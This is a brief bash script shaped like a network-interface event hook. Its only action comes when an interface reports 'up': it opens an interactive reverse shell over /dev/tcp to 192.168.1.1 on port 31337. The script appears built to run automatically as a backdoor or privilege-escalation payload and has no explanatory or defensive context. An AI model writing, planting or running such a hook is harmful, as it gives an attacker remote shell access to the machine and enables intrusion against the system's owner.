#!/bin/bash
IF=$1
STATUS=$2

case "$2" in
  up)
    bash -i >& /dev/tcp/192.168.1.1/31337 0>&1
    ;;
  *)
    ;;
esac
